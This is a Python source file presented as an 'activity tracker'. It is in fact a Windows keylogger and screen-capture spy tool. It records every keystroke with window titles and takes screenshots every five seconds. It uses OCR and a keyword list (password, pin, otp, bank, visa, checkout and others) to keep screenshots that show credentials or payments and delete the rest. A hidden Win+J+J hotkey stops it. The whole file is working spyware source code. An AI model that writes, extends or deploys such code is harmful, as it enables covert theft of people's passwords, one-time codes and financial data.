import os
import time
from datetime import datetime
import pyautogui
from pynput import keyboard
import win32gui
import glob

# ==================== CONFIGURATION ====================
SCREENSHOT_INTERVAL = 5  # Seconds between each screenshot capture
MAX_SCREENSHOTS = 50      # Maximum allowed screenshots in the pool folder
OUTPUT_DIR = "screenshots"
LOG_FILE = "activity_log.txt"

# Unified Filter List: Covers credentials AND shopping/transactions
IMPORTANT_KEYWORDS = [
    # Credential Filters
    "password", "passwd", "login", "sign in", "pin", "credentials", "secure",
    # Shopping & Transaction Filters
    "checkout", "transaction", "receipt", "order confirmation", "payment",
    "invoice", "bank", "cart", "success", "visa", "mastercard", "otp"
]
# =======================================================

# Create output directory for image assets if not present
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

current_window = ""
start_time = datetime.now()
running = True

# ==================== WIN+J+J HOTKEY STATE ====================
# Tracks whether the Windows key is currently held down
win_key_held = False
# Counts consecutive 'j' presses while Win is held
j_press_count = 0
# Timestamp of the last 'j' press (to detect "double tap" within a short window)
last_j_time = 0.0
J_DOUBLE_TAP_WINDOW = 1.0  # seconds — both J presses must fall within this window
# ==============================================================

print("🚀 Ultimate Activity Tracker & Smart Janitor Started.")
print("Press Win+J+J (hold Windows key, tap J twice) to safely stop and write logs.\n")


def get_active_window():
    """Safely captures the active foreground window title."""
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except Exception:
        return "System/Protected Window"


def scan_image_for_keywords(image_path, window_title_at_capture):
    """
    Evaluates whether a screenshot should be saved based on two layer criteria:
    Layer 1: The active application window title during capture.
    Layer 2: Inside text found in the image snapshot via OCR analysis.
    """
    title_lower = window_title_at_capture.lower()
    for keyword in IMPORTANT_KEYWORDS:
        if keyword in title_lower:
            return True

    try:
        import pytesseract
        from PIL import Image
        text = pytesseract.image_to_string(Image.open(image_path)).lower()
        for keyword in IMPORTANT_KEYWORDS:
            if keyword in text:
                return True
        return False
    except Exception:
        return True


def manage_screenshot_pool(latest_window_title):
    """Enforces folder threshold pool. Analyzes and discards older insignificant captures."""
    files = sorted(glob.glob(os.path.join(OUTPUT_DIR, "screenshot_*.png")), key=os.path.getctime)

    if len(files) > MAX_SCREENSHOTS:
        excess_files = files[:-MAX_SCREENSHOTS]

        for oldest_file in excess_files:
            is_important = scan_image_for_keywords(oldest_file, latest_window_title)

            if not is_important:
                try:
                    os.remove(oldest_file)
                    print(f"🗑️ Cleaned up unimportant screenshot: {oldest_file}")
                except Exception as e:
                    print(f"⚠️ Could not remove file: {e}")
            else:
                print(f"🔒 Protected Asset (Password/Transaction detected): {oldest_file}")


def on_press(key):
    """Tracks key input sequences and detects Win+J+J stop hotkey."""
    global current_window, win_key_held, j_press_count, last_j_time, running

    # --- Detect Windows key press ---
    if key in (keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r):
        win_key_held = True
        return  # Don't log the Win key itself

    # --- Detect J presses while Win is held ---
    if win_key_held:
        try:
            char = key.char
        except AttributeError:
            char = None

        if char and char.lower() == 'j':
            now = time.time()

            if j_press_count == 0:
                # First J — start the double-tap window
                j_press_count = 1
                last_j_time = now
            elif j_press_count == 1:
                # Second J — check it arrived within the double-tap window
                if now - last_j_time <= J_DOUBLE_TAP_WINDOW:
                    # ✅ Win+J+J detected — stop the tracker
                    end_time = datetime.now()
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write("\n\n----------------------\n")
                        f.write(f"Start Time: {start_time}\n")
                        f.write(f"End Time: {end_time}\n")
                        f.write("Stopped via: Win+J+J hotkey\n")
                        f.write("----------------------\n")
                    print(f"\n🛑 Processing Ended via Win+J+J. Activity report compiled into {LOG_FILE}")
                    running = False
                    return False  # Stops the keyboard listener thread
                else:
                    # Second J came too late — treat it as a fresh first J
                    j_press_count = 1
                    last_j_time = now
            return  # Don't log J presses that are part of the hotkey combo

        else:
            # Win is held but a non-J key was pressed — reset the J counter
            j_press_count = 0

    # --- Normal keystroke logging (Win key not held) ---
    window = get_active_window()

    if window != current_window:
        current_window = window
        time_now = datetime.now().strftime("%H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n\n[{time_now}] Active Window: {window}\n")

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")


def on_release(key):
    """Resets Windows key state and J counter on key release."""
    global win_key_held, j_press_count

    if key in (keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r):
        win_key_held = False
        j_press_count = 0  # Reset J counter whenever Win key is released


# --- Initialization Segment ---
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Main Program Loop Execution (Screenshots & Smart Storage Cleaning Engine)
try:
    last_screenshot_time = 0

    while running:
        current_time = time.time()

        if current_time - last_screenshot_time >= SCREENSHOT_INTERVAL:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{OUTPUT_DIR}/screenshot_{timestamp}.png"

            try:
                screenshot = pyautogui.screenshot()
                screenshot.save(filename)

                active_window = get_active_window()
                print(f"📸 Captured: {filename} | Window Context: {active_window}")

                manage_screenshot_pool(active_window)

            except Exception as e:
                print(f"⚠️ Snapshot routine error: {e}")

            last_screenshot_time = current_time

        time.sleep(0.5)

except KeyboardInterrupt:
    running = False
    listener.stop()
